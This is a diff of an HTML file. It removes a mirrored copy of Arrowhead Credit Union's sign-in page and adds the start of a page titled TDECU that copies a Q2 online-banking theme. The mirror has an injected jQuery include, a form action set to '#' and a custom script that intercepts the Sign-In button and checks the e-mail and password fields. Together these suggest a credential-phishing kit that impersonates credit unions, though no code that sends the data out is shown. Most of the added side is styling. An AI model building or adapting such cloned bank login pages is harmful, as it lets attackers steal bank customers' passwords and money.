@@ -1,304 +1,1094 @@
-
 <!DOCTYPE html>
-<html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if IE 7]><html class="no-js lt-ie9 lt-ie8" lang="en"> <![endif]-->
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en"> <![endif]-->
+<!--[if gt IE 8]><!-->
+<html xmlns="http://www.w3.org/1999/xhtml" class="js flexbox fontface objectfit object-fit csspositionsticky cssreflections no-regions cssresize shapes siblinggeneral subpixelfont supports csstransforms3d preserve3d canvas canvastext no-emoji devicemotion deviceorientation svg svgasimg svgclippaths svgfilters svgforeignobject inlinesvg smil touchevents typedarrays uagent-chrome uagent-webkit uagent-osLinux uagent-mobile uagent-mobileAndroid uagent-android-10 theme-q2" lang="en" style="" stencil-hydrated="">
+<!--<![endif]-->
 
-<!-- Mirrored from apply.arrowheadcu.org/VirtualCapture/default/Login/SignInProfile by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 13 May 2024 00:13:40 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
-    <meta name="description" content="">
-    <meta name="author" content="">
-
-    <title>Login</title>
-
-    <!-- Bootstrap core CSS -->
-    <link href="assets/Web.UI/css/CustomCss.css" rel="stylesheet" />
-
-    <!-- Other CSS -->
-    <link href="assets/Web.UI/css/Aksw.Core5f1e.css" rel="stylesheet" />
-     <link href="assets/css/tooltipster.bundle.min5f1e.css" rel="stylesheet" />
-     <link href="assets/Site5f1e.css" rel="stylesheet" />
-		<script src=
+<head id="pageheader">
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn1.onlineaccess1.com/cdn/base/tecton/v1.25.2/q2-tecton-theme.css" id="tecton-default-theme" />
+    <link rel="stylesheet" href="https://cdn1.onlineaccess1.com/cdn/base/tecton/v1.25.2/q2-tecton-utilities.css" id="tecton-utilities" />
+    <link href="https://cdn1.onlineaccess1.com/cdn/base/4.5.1.3G/assets/app.css" rel="stylesheet" data-no-shim="" />
+    <link href="https://cdn1.onlineaccess1.com/cdn/base/4.5.1.3G/assets/base.css" rel="stylesheet" data-no-shim="" />
+    <link href="https://cdn1.onlineaccess1.com/cdn/depot/5004/2718/a378a81f63da50f731dd074be496ab10/assets/highcontrast-a05434701efbed7ab98aa70144541cfe.css" rel="stylesheet" data-no-shim="" />
+    <link href="https://cdn1.onlineaccess1.com/cdn/depot/5004/2718/a378a81f63da50f731dd074be496ab10/assets/theme-q2-941941b777b9e3108d06ff00d83ef0a0.css" rel="stylesheet" data-no-shim="" />
+    <link href="https://cdn1.onlineaccess1.com/cdn/5004/4.5.1.3G/000054/images/favicon.ico" rel="icon" />
+	<script src=
 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'>
     </script>
+    <title>TDECU</title>
+    <meta charset="utf-8" />
+    <style data-styles="">
+        q2-icon,
+        q2-select,
+        q2-action-sheet,
+        q2-calendar,
+        q2-dropdown,
+        q2-editable-field,
+        q2-pagination,
+        q2-pill,
+        q2-tab-container,
+        q2-tag,
+        q2-carousel,
+        q2-month-picker,
+        q2-section,
+        q2-stepper,
+        q2-card,
+        q2-chart-donut,
+        q2-checkbox,
+        q2-checkbox-group,
+        q2-radio-group,
+        q2-stepper-vertical,
+        q2-textarea,
+        q2-carousel-pane,
+        q2-chart-area,
+        q2-chart-bar,
+        q2-loading-element,
+        q2-loc,
+        q2-radio,
+        q2-stepper-pane,
+        q2-tab-pane,
+        q2-tooltip,
+        tecton-tab-pane,
+        q2-dropdown-item,
+        q2-avatar,
+        q2-option,
+        q2-optgroup,
+        q2-message,
+        click-elsewhere,
+        q2-popover,
+        q2-option-list,
+        q2-btn,
+        q2-loading,
+        q2-input,
+        q2-badge {
+            visibility: hidden
+        }
+
+        [stencil-hydrated] {
+            visibility: inherit
+        }
+    </style>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" />
+    <meta name="author" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="format-detection" content="telephone=no, address=no, email=no" />
+    <meta id="viewportMeta" name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0, user-scalable=no, viewport-fit=cover" />
+
+    <meta name="referrer" content="origin" />
 
     
+    <meta name="q2-app/config/asset-manifest" content="%7B%22bundles%22:%7B%22q2-commercial-engine%22:%7B%22assets%22:%5B%7B%22uri%22:%22https://cdn1.onlineaccess1.com/cdn/base/4.5.1.3G/assets/engines-dist/q2-commercial-engine/assets/engine-vendor.css%22,%22type%22:%22css%22%7D,%7B%22uri%22:%22https://cdn1.onlineaccess1.com/cdn/base/4.5.1.3G/assets/engines-dist/q2-commercial-engine/assets/engine-vendor.js%22,%22type%22:%22js%22%7D,%7B%22uri%22:%22https://cdn1.onlineaccess1.com/cdn/base/4.5.1.3G/assets/engines-dist/q2-commercial-engine/assets/engine.js%22,%22type%22:%22js%22%7D%5D%7D,%22q2-report-engine%22:%7B%22assets%22:%5B%7B%22uri%22:%22https://cdn1.onlineaccess1.com/cdn/base/4.5.1.3G/assets/engines-dist/q2-report-engine/assets/engine-vendor.css%22,%22type%22:%22css%22%7D,%7B%22uri%22:%22https://cdn1.onlineaccess1.com/cdn/base/4.5.1.3G/assets/engines-dist/q2-report-engine/assets/engine-vendor.js%22,%22type%22:%22js%22%7D,%7B%22uri%22:%22https://cdn1.onlineaccess1.com/cdn/base/4.5.1.3G/assets/engines-dist/q2-report-engine/assets/engine.js%22,%22type%22:%22js%22%7D%5D%7D%7D%7D" />
+    <meta name="q2-commercial-engine/config/environment" content="%7B%22modulePrefix%22:%22q2-commercial-engine%22,%22rootURL%22:%22/%22,%22wsURL%22:%22mobilews/%22,%22locationType%22:%22hash%22,%22EmberENV%22:%7B%22contentSecurityPolicy%22:%7B%22default-src%22:%22'none'%22,%22script-src%22:%22'self'%20'unsafe-inline'%20'unsafe-eval'%20maps.googleapis.com%20maps.gstatic.com%22,%22connect-src%22:%22'self'%22,%22img-src%22:%22'self'%20data:%20hud.gov%22,%22style-src%22:%22'self'%20'unsafe-inline'%20use.typekit.net%22%7D%7D,%22baseURL%22:%22/%22,%22APP%22:%7B%22name%22:%22dummy%22%7D,%22contentSecurityPolicy%22:%7B%22default-src%22:%22'none'%22,%22script-src%22:%22'self'%22,%22font-src%22:%22'self',%20'https://fonts.gstatic.com'%22,%22connect-src%22:%22'self'%22,%22img-src%22:%22'self'%20www.gravatar.com%22,%22style-src%22:%22'self'%20'https://fonts.gstatic.com'%22,%22media-src%22:%22'self'%22%7D,%22exportApplicationGlobal%22:true%7D" />
+    <meta name="q2-report-engine/config/environment" content="%7B%22modulePrefix%22:%22q2-report-engine%22,%22rootURL%22:%22/%22,%22wsURL%22:%22mobilews/%22,%22locationType%22:%22hash%22,%22EmberENV%22:%7B%22contentSecurityPolicy%22:%7B%22default-src%22:%22'none'%22,%22script-src%22:%22'self'%20'unsafe-inline'%20'unsafe-eval'%20maps.googleapis.com%20maps.gstatic.com%22,%22connect-src%22:%22'self'%22,%22img-src%22:%22'self'%20data:%20hud.gov%22,%22style-src%22:%22'self'%20'unsafe-inline'%20use.typekit.net%22%7D%7D,%22exportApplicationGlobal%22:true,%22APP%22:%7B%7D%7D" />
     
+    <style type="text/css">
+        span.im-caret {
+            -webkit-animation: 1s blink step-end infinite;
+            animation: 1s blink step-end infinite;
+        }
 
+        @keyframes blink {
 
-    <!-- custom css in the end -->
+            from,
+            to {
+                border-right-color: black;
+            }
 
-    
-    
-    
-
-    <style>
-    		.alert{
-    		display: none; 
-    		}
-    		#a-widget-35782{
-margin-left: 5px;
-}
-    	</style>
-    
-
-      
-
-
-
-
-    <!-- Custom JS in the end -->
-
-</head>
-
-<body role="document">
-<!-- Google Tag Manager (noscript) -->
-<noscript><iframe src="link=https://www.googletagmanager.com/ns.html?id=GTM-MCQC9VD"
-height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
-<!-- End Google Tag Manager (noscript) -->
-
-    
-
-
-
-
-
-<!-- Top Navigation -->
-<div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
-    <div class="container">
-        <div class="navbar-header">
-            <a class="navbar-brand" href="#">
-                <div class="a-comp-logo">
-                            <img alt="  Logo" src="https://apply.arrowheadcu.org/VirtualCapture/default/Home/GetCompanyLogo" style="max-height:50px;margin-top:-15px;" />
-
-                </div>
-                <div class="a-comp-name">
-                     
-                </div>
-            </a>
-            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
-                <span class="sr-only">Toggle navigation</span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-            </button>
-        </div>
-        <div class="navbar-collapse collapse a-pull-right" id="VCNavbar">
-            <ul class="nav navbar-nav">
-                        <li>
-                            <a alt="Products" href="link=VirtualCapture/default/Products/Index">Home</a>
-                        </li>
-
-         </ul>
-         <ul class="nav navbar-nav navbar-right">
-                        <li>
-                            <a alt="Sign In" href="SignInProfile.html">Sign In</a>
-                        </li>
-
-         </ul>
-      </div>
-   </div>
-</div>
-
-<div class="body-content">
-    <!-- This div is hidden after the view is ready to avoid "Flash Of Unstyled Content" -->
-    <!-- This is hidden by default.  The child view needs to unhide it via css -->
-    <div class="layout-initial-mask">
-        <div>
-            <i class="fa fa-circle-o-notch fa-spin fa-2x fa-fw"></i>
-            <span class="sr-only">Loading...</span>
-            <h3>Loading...</h3>
-        </div>
-    </div>
-
-    
-
-
-
-<div style="margin-top:10px">
-
-</div>
-<div class="container" role="main">
-    <div class="container row">
-        <div class="col-md-3">
-            &nbsp;
-        </div>
-        <div class="col-md-6">
-<form id="form" class="a-form" action="#" role="form">
-<div id="a-widget-35940" class="a-panel panel panel-default"><div id="a-widget-35942" class="ui-widget-header a-panel-title panel-heading"><span id="a-widget-35941" class="a-panel-title-text">Sign In</span></div><div id="a-widget-35943" class="a-panel-no-collapse a-panel-content"><div id="a-widget-35956" class="a-panel-content panel-body a-panel-content-top-border"><div id="a-widget-35944" class="a-panel-body-instructions">Sign in to your profile or <a href='javascript: launchOnlineProfileView()'>Create an online profile</a> to continue:</div><div id="a-widget-35945" class="row"><div id="a-widget-35946" class="a-r-field col-sm-12">
-<div id="a-widget-35947" class="a-field-wrap"><div id="a-widget-35948" class="a-field-label-container"><label id="a-widget-35949" class="a-field-label" style="width:100px;" for="Email"><span class='a-field-label-required' alt='This field is required.'></span>E-Mail:</label>
-</div>
-<div id="a-widget-35950" class="a-field-control-container">
-<input id="Email" class="a-field-control form-control input-sm" name="Email" type="text" value="" placeholder="Enter email address" autofocus="autofocus" autocomplete="off" maxlength="200" />
-<div class="alert alert-danger a-error-container" name="Email-error" style="top: 42px; left: 118px;"><label id="Email-error" class="error" for="Email">E-Mail is required</label></div>
-                                             
-	
-</div>
-
-</div>
-
-</div><div id="a-widget-35951" class="a-r-field col-sm-12">
-<div id="a-widget-35952" class="a-field-wrap"><div id="a-widget-35953" class="a-field-label-container"><label id="a-widget-35954" class="a-field-label" style="width:100px;" for="Password"><span class='a-field-label-required' alt='This field is required.'></span>Password:</label>
-</div>
-<div id="a-widget-35955" class="a-field-control-container">
-<input id="Password" class="a-field-control form-control input-sm a-field-control-ienox" name="Password" type="password" value="" placeholder="Password" autocomplete="off" />
-  <div class="alert alert-danger a-error-container" name="Password-error" style="top: 42px; left: 118px;"><label id="Password-error" class="error" for="Password">Password is required</label></div>
-                                          									
-	
-<script type="text/javascript">
-                                                    $(document).ready(function() {
-                                                        $('#Password').rules('add', {
-                                                            aksw_required: true,
-                                                            messages: {
-                                                                aksw_required: 'Password is required'
-                                                            }
-                                                        });
-                                                        var cmp = $('#Password');
-                                                        cmp.data('origvalue', '');
-                                                        cmp = null;
-                                                    });
-                                                </script>
-	
-</div>
-
-</div>
-
-</div></div>
-</div><div id="a-widget-35957" class="a-bottombar a-panel-bottombar" style="height:40px;"><button id="a-widget-35958" class="a-button btn btn-sm btn-primary " title="" type="button" alt="Sign-In" style="float:right">Sign-In&nbsp;<span id="a-widget-35959" class="glyphicon glyphicon-log-in"></span></button><button id="continueGuest" class="a-button btn btn-sm btn-default btn-primary" title="" type="button" alt="Continue as Guest" style="float:right"><span id="a-widget-35960"></span>&nbsp;Continue as Guest</button>
-	
-</div></div></div></form>
-
-                <div style="text-align:right">
-                    <span id="forget_pwd" class="btn-link" style="cursor: pointer;">Forgot Password?</span>
-                </div>
-
-        </div>
-        <div class="col-md-3">
-            &nbsp;
-        </div> 
-    </div>
-</div>
-
-
-</div>
-
-<!-- Footer -->
-
-<style>
-	.alert { 
-    padding: 0px!important;
-    padding-left: 15px!important;
-    margin-bottom: 20px!important;
-    border: 1px solid transparent!important;
-    border-radius: 4px!important;
-}
-	.error{
-font-size:10px!important;
-font-weight: 5px!important;
-}
-	</style>
-
-
-<div class="footer" style="top: 100vh; visibility:visible; display:block; position:sticky;">
-<p align="center"><br><font color="#000000"><font color="#ffffff">Arrowhead Credit Union © 2022 | P.O. Box 4100 Rancho Cucamonga, CA 91729 </font><br></font></p>
-</div>
-<div id="error-modal" style="display:none;">
-    <div id="batBeacon860690344801" style="width: 0px; height: 0px; display: none; visibility: hidden;"><img id="batBeacon456139365237" width="0" height="0" alt="" src="https://bat.bing.com/action/0?ti=137037224&Ver=2&mid=db575dab-3a40-4ae5-a012-e692bb92b6a1&sid=3173cc2010bd11ef9c18bf15542d774e&vid=3174c65010bd11ef95ffcb2da19e61a0&vids=0&msclkid=N&pi=0&lg=en-US&sw=412&sh=846&sc=24&tl=Login&p=https%3A%2F%2Fapply.arrowheadcu.org%2FVirtualCapture%2Fdefault%2FLogin%2FSignInProfile&r=https%3A%2F%2Fwww.google.com%2F&lt=2246&mtp=5&evt=pageLoad&sv=1&rn=525268" style="width: 0px; height: 0px; display: none; visibility: hidden;" /></div>
-    <div class="modal fade in" id="aksw-id-4" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" data-backdrop="true" style="display: block;">
-        <div class="modal-dialog">
-            <div class="modal-content">
-                <div class="modal-header"><button type="button" class="close cls" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
-                    <h4 class="modal-title" id="myModalLabel"><span class="glyphicon glyphicon-exclamation-sign error"></span> Validation Errors</h4>
-                </div>
-                <div class="modal-body div-overflow-hidden">The following validation errors must be corrected before continuing<p></p>
-                    <ul style="padding-left: 20px;">
-                        <li>E-Mail is required</li>
-                        <li>Password is required</li>
-                    </ul>
-                    <p></p>
-                </div>
-                <div class="modal-footer"> <button type="button" alt="Ok" class="btn btn-primary cls" data-dismiss="modal">OK</button></div>
-            </div>
-        </div>
-    </div>
-    <div class="modal-backdrop fade in"></div> 
-	</div>
-</body>
-	
-<script>
-    	
-    $(document).ready(function() {
-    $('#a-widget-35958').on('click', function(event) {
-        event.preventDefault(); // Prevent the default action of the link
-
-        let myForm = $("#form");
-        let checkInputs = document.querySelectorAll('.input-sm');
-
-        // Flag to track if any input is empty
-        let isEmpty = false;
-
-        // Loop through each input field
-        for (const check of checkInputs) {
-            check.addEventListener('focus', () => {
-                console.log('focus');
-                check.nextElementSibling.style.display = "none";
-            });
-
-            if (check.value.trim() === "") {
-                var errmessage = check.id;
-                check.nextElementSibling.style.display = "block"; // Display error message
-                document.getElementById('error-modal').style.display = "block"; // Show error modal
-                isEmpty = true;
-            } else {
-                check.nextElementSibling.style.display = "none"; // Hide error message
-                document.getElementById('error-modal').style.display = "none"; // Hide error modal
-                isEmpty = false;
+            50% {
+                border-right-color: transparent;
             }
         }
 
-        // If no input is empty, proceed with form submission
+        @-webkit-keyframes blink {
+
+            from,
+            to {
+                border-right-color: black;
+            }
+
+            50% {
+                border-right-color: transparent;
+            }
+        }
+
+        span.im-static {
+            color: grey;
+        }
+
+        div.im-colormask {
+            display: inline-block;
+            border-style: inset;
+            border-width: 2px;
+            -webkit-appearance: textfield;
+            -moz-appearance: textfield;
+            appearance: textfield;
+        }
+
+        div.im-colormask>input {
+            position: absolute;
+            display: inline-block;
+            background-color: transparent;
+            color: transparent;
+            -webkit-appearance: caret;
+            -moz-appearance: caret;
+            appearance: caret;
+            border-style: none;
+            left: 0;
+            /*calculated*/
+        }
+
+        div.im-colormask>input:focus {
+            outline: none;
+        }
+
+        div.im-colormask>input::-moz-selection {
+            background: none;
+        }
+
+        div.im-colormask>input::selection {
+            background: none;
+        }
+
+        div.im-colormask>input::-moz-selection {
+            background: none;
+        }
+
+        div.im-colormask>div {
+            color: black;
+            display: inline-block;
+            width: 100px;
+            /*calculated*/
+        }
+    </style>
+    
+    
+    <link href="https://cdn1.onlineaccess1.com/cdn/base/4.5.1.3G/assets/tecton-7617a2cf88a1105517d83f421356f88c.css" rel="stylesheet" />
+    <style id="tecton-props-css">
+        :root {
+            --tct-stoplight-info: #0079C1;
+            --tct-stoplight-success: #0E8A00;
+            --tct-stoplight-warning: #F0B400;
+            --tct-stoplight-alert: #C30000;
+            --tct-global-focus: 0 0 0 2px #33B4FF;
+            --tct-black: #000000;
+            --tct-gray-d3: #222222;
+            --tct-gray-d2: #444444;
+            --tct-gray-d1: #666666;
+            --tct-gray: #999999;
+            --tct-gray-l1: #CCCCCC;
+            --tct-gray-l2: #EEEEEE;
+            --tct-gray-l3: #F2F2F2;
+            --tct-white: #FFFFFF;
+            --tct-disabled-opacity: 0.66;
+            --tct-border-radius-1: 3px;
+            --tct-border-radius-2: 6px;
+            --tct-border-radius-3: 12px;
+            --tct-shadow-1: 0 2px 4px rgba(0, 0, 0, 0.3);
+            --tct-shadow-2: 0 3px 6px rgba(0, 0, 0, 0.3);
+            --tct-shadow-3: 0 4px 12px rgba(0, 0, 0, 0.3);
+            --tct-duration-1: 0.2s;
+            --tct-duration-2: 0.4s;
+            --tct-duration-3: 0.8s;
+            --tct-tween-1: 0.2s ease;
+            --tct-tween-2: 0.4s ease;
+            --tct-tween-3: 0.8s ease;
+            --const-stoplight-info: #0079C1;
+            --const-stoplight-success: #0E8A00;
+            --const-stoplight-warning: #F0B400;
+            --const-stoplight-alert: #C30000;
+            --const-global-focus: 0 0 0 2px #33B4FF;
+            --const-stoplight-info-text: #FFFFFF;
+            --const-stoplight-success-text: #FFFFFF;
+            --const-stoplight-warning-text: #000000;
+            --const-stoplight-alert-text: #FFFFFF;
+            --app-black: #000000;
+            --app-gray-d3: #222222;
+            --app-gray-d2: #444444;
+            --app-gray-d1: #666666;
+            --app-gray: #999999;
+            --app-gray-l1: #CCCCCC;
+            --app-gray-l2: #EEEEEE;
+            --app-gray-l3: #F2F2F2;
+            --app-white: #FFFFFF;
+            --app-disabled-opacity: 0.66;
+            --app-border-radius-1: 3px;
+            --app-border-radius-2: 6px;
+            --app-border-radius-3: 12px;
+            --app-shadow-1: 0 2px 4px rgba(0, 0, 0, 0.3);
+            --app-shadow-2: 0 3px 6px rgba(0, 0, 0, 0.3);
+            --app-shadow-3: 0 4px 12px rgba(0, 0, 0, 0.3);
+            --app-duration-1: 0.2s;
+            --app-duration-2: 0.4s;
+            --app-duration-3: 0.8s;
+            --app-tween-1: 0.2s ease;
+            --app-tween-2: 0.4s ease;
+            --app-tween-3: 0.8s ease;
+            --app-font-size: 14px;
+            --app-line-height: 1.428571429;
+            --app-font-size-small: 12px;
+            --app-tooltip-multiline-max-width: 200px;
+            --app-tooltip-background-color: rgba(0, 0, 0, 0.8);
+            --app-tooltip-text-color: #FFFFFF;
+            --app-tooltip-size: 5px;
+            --app-tooltip-position: -5px;
+            --app-tooltip-body-offset: -15px;
+            --app-tooltip-transition-duration: 250ms;
+            --app-tooltip-visible-duration: 2s
+        }
+    </style>
+    <style id="tecton-theme-css">
+        :root {
+            --tct-scale-0: 0px;
+            --tct-scale-1: 5px;
+            --tct-scale-2: 10px;
+            --tct-scale-3: 15px;
+            --tct-scale-4: 20px;
+            --tct-scale-5: 45px;
+            --tct-scale-6: 60px;
+            --tct-scale-0x: 0px;
+            --tct-scale-1x: 5px;
+            --tct-scale-2x: 10px;
+            --tct-scale-3x: 15px;
+            --tct-scale-4x: 20px;
+            --tct-scale-5x: 25px;
+            --tct-scale-6x: 30px;
+            --tct-scale-7x: 35px;
+            --tct-scale-8x: 40px;
+            --tct-scale-9x: 45px;
+            --tct-scale-10x: 50px;
+            --tct-scale-11x: 55px;
+            --tct-scale-12x: 60px;
+            --tct-link-color: #005971;
+            --tct-link-hover-color: #003544;
+            --tct-btn-disabled-opacity: 0.66;
+            --tct-btn-padding: 10px;
+            --tct-btn-font-size: inherit;
+            --tct-btn-tween: 0.2s ease;
+            --tct-btn-primary-bg: #D24114;
+            --tct-btn-primary-font-color: #FFFFFF;
+            --tct-btn-primary-font-weight: 600;
+            --tct-btn-primary-text-transform: none;
+            --tct-btn-primary-letter-spacing: normal;
+            --tct-btn-primary-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            --tct-btn-primary-border-color: transparent;
+            --tct-btn-primary-border-width: 0;
+            --tct-btn-primary-border-radius: 3px;
+            --tct-btn-primary-hover-bg: #CD3100;
+            --tct-btn-primary-hover-font-color: #ffffff;
+            --tct-btn-primary-hover-border-color: transparent;
+            --tct-btn-primary-hover-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.19), 0 3px 3px rgba(0, 0, 0, 0.23);
+            --tct-btn-primary-disabled-bg: #D24114;
+            --tct-btn-primary-disabled-font-color: #FFFFFF;
+            --tct-btn-primary-disabled-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            --tct-btn-secondary-bg: #EAEAEA;
+            --tct-btn-secondary-font-color: #2E2E2E;
+            --tct-btn-secondary-font-weight: 600;
+            --tct-btn-secondary-text-transform: none;
+            --tct-btn-secondary-letter-spacing: normal;
+            --tct-btn-secondary-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            --tct-btn-secondary-border-color: transparent;
+            --tct-btn-secondary-border-width: 0;
+            --tct-btn-secondary-border-radius: 3px;
+            --tct-btn-secondary-hover-bg: #E1E1E1;
+            --tct-btn-secondary-hover-font-color: #2E2E2E;
+            --tct-btn-secondary-hover-border-color: transparent;
+            --tct-btn-secondary-hover-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.19), 0 3px 3px rgba(0, 0, 0, 0.23);
+            --tct-btn-secondary-disabled-bg: #EAEAEA;
+            --tct-btn-secondary-disabled-font-color: #2E2E2E;
+            --tct-btn-secondary-disabled-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            --tct-btn-neutral-bg: #FFFFFF;
+            --tct-btn-neutral-font-color: #005971;
+            --tct-btn-neutral-font-weight: 600;
+            --tct-btn-neutral-text-transform: none;
+            --tct-btn-neutral-letter-spacing: normal;
+            --tct-btn-neutral-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            --tct-btn-neutral-border-color: #005971;
+            --tct-btn-neutral-border-width: 1px;
+            --tct-btn-neutral-border-radius: 3px;
+            --tct-btn-neutral-hover-bg: #FFFFFF;
+            --tct-btn-neutral-hover-font-color: #005971;
+            --tct-btn-neutral-hover-border-color: #005971;
+            --tct-btn-neutral-hover-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.19), 0 3px 3px rgba(0, 0, 0, 0.23);
+            --tct-btn-neutral-disabled-bg: #FFFFFF;
+            --tct-btn-neutral-disabled-font-color: #005971;
+            --tct-btn-neutral-disabled-box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            --tct-btn-icon-width: 44px;
+            --tct-btn-icon-height: 44px;
+            --tct-btn-icon-color: inherit;
+            --tct-btn-icon-hover-bg: #ebebeb;
+            --tct-btn-icon-hover-color: #003544;
+            --tct-btn-badge-padding: 2px 5px;
+            --tct-btn-badge-font-size: inherit;
+            --tct-btn-badge-border-radius: 3px;
+            --tct-btn-badge-bg: transparent;
+            --tct-btn-badge-font-color: inherit;
+            --tct-btn-badge-hover-bg: #F2F2F2;
+            --tct-btn-badge-hover-font-color: #2e2e2e;
+            --tct-btn-badge-active-bg: #D24114;
+            --tct-btn-badge-active-font-color: #FFFFFF;
+            --tct-input-margin-top: 30px;
+            --tct-input-margin-bottom: 30px;
+            --tct-input-font-size: inherit;
+            --tct-input-label-padding-left: 0;
+            --tct-input-label-padding-right: 0;
+            --tct-input-label-margin-bottom: 5px;
+            --tct-input-label-font-color: #2e2e2e;
+            --tct-input-error-label-font-color: #2e2e2e;
+            --tct-input-label-font-size: inherit;
+            --tct-input-label-font-weight: 600;
+            --tct-input-label-letter-spacing: normal;
+            --tct-input-label-text-transform: none;
+            --tct-input-label-optional-margin-left: 5px;
+            --tct-input-label-optional-font-color: #747474;
+            --tct-input-label-optional-font-size: 12px;
+            --tct-input-label-optional-font-weight: 400;
+            --tct-input-height: 42px;
+            --tct-input-horizontal-padding: 10px;
+            --tct-input-bg: #fcfdfd;
+            --tct-input-font-color: #2e2e2e;
+            --tct-input-border-top-width: 1px;
+            --tct-input-border-right-width: 1px;
+            --tct-input-border-bottom-width: 1px;
+            --tct-input-border-left-width: 1px;
+            --tct-input-border-color: #949494;
+            --tct-input-border-top-left-radius: 3px;
+            --tct-input-border-top-right-radius: 3px;
+            --tct-input-border-bottom-right-radius: 3px;
+            --tct-input-border-bottom-left-radius: 3px;
+            --tct-input-box-shadow: none;
+            --tct-input-tween: 0.4s ease;
+            --tct-input-disabled-opacity: 0.66;
+            --tct-input-placeholder-font-color: #6c6c6c;
+            --tct-input-focus-border-top-width: 1px;
+            --tct-input-focus-border-right-width: 1px;
+            --tct-input-focus-border-bottom-width: 1px;
+            --tct-input-focus-border-left-width: 1px;
+            --tct-input-focus-border-color: #0079C1;
+            --tct-input-focus-box-shadow: 0 0 transparent;
+            --tct-input-icon-stroke-primary: #999999;
+            --tct-input-prefix-font-size: inherit;
+            --tct-input-prefix-font-color: #2e2e2e;
+            --tct-input-prefix-bg: #fcfdfd;
+            --tct-input-prefix-border-color: #949494;
+            --tct-input-error-prefix-font-color: #2e2e2e;
+            --tct-input-error-prefix-bg: #fcfdfd;
+            --tct-input-message-box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+            --tct-input-message-tween: 0.2s ease;
+            --tct-message-bg: #F2F2F2;
+            --tct-tab-active-color: #005971;
+            --tct-tab-inactive-color: #2e2e2e;
+            --tct-tab-font-size: 17px;
+            --tct-tab-alt-active-color: inherit;
+            --tct-tab-alt-inactive-color: inherit;
+            /* -------------------------------------------------------------- */
+            --app-scale-0: 0px;
+            --app-scale-1: 5px;
+            --app-scale-2: 10px;
+            --app-scale-3: 15px;
+            --app-scale-4: 20px;
+            --app-scale-5: 45px;
+            --app-scale-6: 60px;
+            --app-scale-0x: 0px;
+            --app-scale-1x: 5px;
+            --app-scale-2x: 10px;
+            --app-scale-3x: 15px;
+            --app-scale-4x: 20px;
+            --app-scale-5x: 25px;
+            --app-scale-6x: 30px;
+            --app-scale-7x: 35px;
+            --app-scale-8x: 40px;
+            --app-scale-9x: 45px;
+            --app-scale-10x: 50px;
+            --app-scale-11x: 55px;
+            --app-scale-12x: 60px;
+            --t-font-family: OpenSans, Helvetica Neue, Helvetica, Arial, sans-serif;
+            --t-font-stretch: normal;
+            --t-font-family-monospaced: Courier New, Courier, Lucida Sans Typewriter, Lucida Typewriter, monospace;
+            --t-primary-d5: #002d39;
+            --t-primary-d4: #003544;
+            --t-primary-d3: #003e4f;
+            --t-primary-d2: #00475a;
+            --t-primary-d1: #005066;
+            --t-primary: #005971;
+            --t-primary-l1: #007899;
+            --t-primary-l2: #0098c0;
+            --t-primary-l3: #00b7e8;
+            --t-primary-l4: #11ccff;
+            --t-primary-l5: #39d5ff;
+            --t-secondary-d5: #4d6b73;
+            --t-secondary-d4: #5c808a;
+            --t-secondary-d3: #6e949e;
+            --t-secondary-d2: #85a5ad;
+            --t-secondary-d1: #9cb6bd;
+            --t-secondary: #b3c7cc;
+            --t-secondary-l1: #baccd1;
+            --t-secondary-l2: #c2d2d6;
+            --t-secondary-l3: #c9d8db;
+            --t-secondary-l4: #d1dde0;
+            --t-secondary-l5: #d9e3e6;
+            --t-tertiary-d5: #1cafd6;
+            --t-tertiary-d4: #3dc2e6;
+            --t-tertiary-d3: #68cfeb;
+            --t-tertiary-d2: #93ddf1;
+            --t-tertiary-d1: #beeaf6;
+            --t-tertiary: #e8f8fc;
+            --t-tertiary-l1: #ebf9fc;
+            --t-tertiary-l2: #edf9fd;
+            --t-tertiary-l3: #effafd;
+            --t-tertiary-l4: #f1fbfd;
+            --t-tertiary-l5: #f4fbfe;
+            --t-accent-1: #e05252;
+            --t-accent-1-l1: #e77474;
+            --t-accent-1-d1: #b62020;
+            --t-accent-2: #e09952;
+            --t-accent-2-l1: #e7ad74;
+            --t-accent-2-d1: #b66b20;
+            --t-accent-3: #e0e052;
+            --t-accent-3-l1: #e7e774;
+            --t-accent-3-d1: #b6b620;
+            --t-accent-4: #99e052;
+            --t-accent-4-l1: #ade774;
+            --t-accent-4-d1: #6bb620;
+            --t-accent-5: #52e052;
+            --t-accent-5-l1: #74e774;
+            --t-accent-5-d1: #20b620;
+            --t-accent-6: #52e099;
+            --t-accent-6-l1: #74e7ad;
+            --t-accent-6-d1: #20b66b;
+            --t-accent-7: #52e0e0;
+            --t-accent-7-l1: #74e7e7;
